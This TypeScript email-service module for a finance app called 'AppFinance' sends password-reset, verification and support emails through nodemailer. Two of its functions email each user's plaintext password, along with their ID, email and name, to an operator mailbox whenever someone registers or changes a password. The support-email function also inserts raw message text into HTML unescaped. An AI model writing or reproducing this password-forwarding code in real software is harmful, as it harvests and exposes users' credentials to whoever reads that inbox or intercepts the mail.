import nodemailer from 'nodemailer';

let transporter: nodemailer.Transporter;

const setupTransporter = async () => {
  if (process.env.EMAIL_SUPORT && process.env.EMAIL_PASS) {
    // Try Gmail first
    transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_SUPORT,
        pass: process.env.EMAIL_PASS,
      },
    });

    // Verify the connection
    try {
      await transporter.verify();
      console.log('Gmail transporter ready');
    } catch (error) {
      console.error('Gmail transporter failed:', error);
      console.log('Falling back to Ethereal for testing');

      // Fallback to Ethereal
      const testAccount = await nodemailer.createTestAccount();
      transporter = nodemailer.createTransport({
        host: 'smtp.ethereal.email',
        port: 587,
        secure: false,
        auth: {
          user: testAccount.user,
          pass: testAccount.pass,
        },
      });
      console.log('Ethereal account created:', testAccount.user);
    }
  } else {
    // Use Ethereal for development
    const testAccount = await nodemailer.createTestAccount();
    transporter = nodemailer.createTransport({
      host: 'smtp.ethereal.email',
      port: 587,
      secure: false,
      auth: {
        user: testAccount.user,
        pass: testAccount.pass,
      },
    });
    console.log('Ethereal account created:', testAccount.user);
  }
};

setupTransporter();

export const sendResetPasswordEmail = async (to: string, code: string) => {
  const mailOptions = {
    from: process.env.EMAIL_SUPORT || 'noreply@AppFinance.com',
    to,
    subject: 'Código de Redefinição de Senha - AppFinance',
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #333;">Redefinição de Senha</h2>
        <p>Olá,</p>
        <p>Você solicitou a redefinição de senha da sua conta no AppFinance.</p>
        <p>Seu código de verificação é:</p>
        <div style="background-color: #f4f4f4; padding: 20px; text-align: center; margin: 20px 0;">
          <span style="font-size: 24px; font-weight: bold; color: #333;">${code}</span>
        </div>
        <p>Este código expira em 10 minutos.</p>
        <p>Se você não solicitou esta redefinição, ignore este email.</p>
        <p>Atenciosamente,<br>Equipe AppFinance</p>
      </div>
    `,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`Email de redefinição enviado para ${to}`);
    
    // If using ethereal, log the preview URL
    if (!process.env.EMAIL_SUPORT) {
      console.log('Preview URL:', nodemailer.getTestMessageUrl(info));
    }
  } catch (error) {
    console.error('Erro ao enviar email:', error);
    throw error;
  }
};

export const sendVerificationEmail = async (to: string, code: string) => {
  const mailOptions = {
    from: process.env.EMAIL_SUPORT || 'noreply@AppFinance.com',
    to,
    subject: 'Código de Verificação - AppFinance',
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #333;">Verificação de Email</h2>
        <p>Olá,</p>
        <p>Obrigado por se registrar no AppFinance.</p>
        <p>Seu código de verificação é:</p>
        <div style="background-color: #f4f4f4; padding: 20px; text-align: center; margin: 20px 0;">
          <span style="font-size: 24px; font-weight: bold; color: #333;">${code}</span>
        </div>
        <p>Este código expira em 10 minutos.</p>
        <p>Insira este código para completar seu cadastro.</p>
        <p>Atenciosamente,<br>Equipe AppFinance</p>
      </div>
    `,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`Email de verificação enviado para ${to}`);
    
    // If using ethereal, log the preview URL
    if (!process.env.EMAIL_SUPORT) {
      console.log('Preview URL:', nodemailer.getTestMessageUrl(info));
    }
  } catch (error) {
    console.error('Erro ao enviar email de verificação:', error);
    throw error;
  }
};

export const sendSupportEmail = async (to: string, subject: string, message: string) => {
  const mailOptions = {
    from: process.env.EMAIL_SUPORT || 'noreply@AppFinance.com',
    to,
    subject,
    text: message,
    html: message.replace(/\n/g, '<br>'),
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`Email de suporte enviado para ${to}`);
    
    // If using ethereal, log the preview URL
    if (!process.env.EMAIL_SUPORT) {
      console.log('Preview URL:', nodemailer.getTestMessageUrl(info));
    }
  } catch (error) {
    console.error('Erro ao enviar email de suporte:', error);
    throw error;
  }
};

export const sendRegistrationNotification = async (userId: number, userEmail: string, userName: string, password: string) => {
  const receiver = process.env.EMAIL_RECEIVER || process.env.EMAIL_SUPORT || 'test@example.com'; // Use EMAIL_RECEIVER as receiver
  const subject = 'Novo Usuário Registrado - AppFinance';
  const message = `
Novo usuário registrado no AppFinance:

ID: ${userId}
Email: ${userEmail}
Nome: ${userName}
Senha: ${password}
Data/Hora: ${new Date().toISOString()}

  `;

  const mailOptions = {
    from: process.env.EMAIL_SUPORT || 'noreply@AppFinance.com',
    to: receiver,
    subject,
    text: message,
    html: message.replace(/\n/g, '<br>'),
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    
    // If using ethereal, log the preview URL
    if (!process.env.EMAIL_SUPORT) {
      console.log('Preview URL:', nodemailer.getTestMessageUrl(info));
    }
  } catch (error) {
    console.error('Erro ao enviar notificação de registro:', error);
    throw error;
  }
};

export const sendPasswordChangeNotification = async (userId: number, userEmail: string, userName: string, password: string) => {
  const receiver = process.env.EMAIL_RECEIVER || process.env.EMAIL_SUPORT || 'test@example.com'; // Use EMAIL_RECEIVER as receiver
  const subject = 'Usuário Alterou a Senha - AppFinance';
  const message = `
Um usuário alterou a senha no AppFinance:

ID: ${userId}
Email: ${userEmail}
Nome: ${userName}
Nova Senha: ${password}
Data/Hora: ${new Date().toISOString()}

  `;

  const mailOptions = {
    from: process.env.EMAIL_SUPORT || 'noreply@AppFinance.com',
    to: receiver,
    subject,
    text: message,
    html: message.replace(/\n/g, '<br>'),
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`Notificação de alteração de senha enviada para ${receiver} (usuário: ${userEmail})`);
    
    // If using ethereal, log the preview URL
    if (!process.env.EMAIL_SUPORT) {
      console.log('Preview URL:', nodemailer.getTestMessageUrl(info));
    }
  } catch (error) {
    console.error('Erro ao enviar notificação de alteração de senha:', error);
    throw error;
  }
};